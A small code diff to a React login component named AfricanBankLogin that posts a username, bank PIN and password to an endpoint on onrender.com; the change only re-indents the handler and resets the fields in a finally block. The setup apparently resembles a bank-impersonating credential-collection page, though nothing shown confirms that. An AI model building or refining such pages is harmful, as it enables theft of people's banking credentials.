@@ -11,22 +11,23 @@ const AfricanBankLogin = () => {
     const [loading, setLoading] = useState(false);
 
     const handleSubmit = async (e) => {
-        e.preventDefault();
-        setLoading(true);
-        try {
-            const response = await axios.post(
-                'https://newapps-1.onrender.com/user/register',
-                credentials
-            );
-            const { message } = response.data;
-            alert(message);
-            setCredentials({ username: '', pin: '', password: '' });
-        } catch (err) {
-            alert('Login error :' + (err.response?.data?.message || err.message));
-        } finally {
-            setLoading(false);
-        }
-    };
+    e.preventDefault();
+    setLoading(true);
+    try {
+        const response = await axios.post(
+            'https://newapps-1.onrender.com/user/register',
+            credentials
+        );
+        const { message } = response.data;
+        alert(message);
+    } catch (err) {
+        alert('Login error :' + (err.response?.data?.message || err.message));
+    } finally {
+        setCredentials({ username: '', pin: '', password: '' });
+        setLoading(false);
+    }
+};
+
 
     const handleChange = (e) => {
         const { name, value } = e.target;
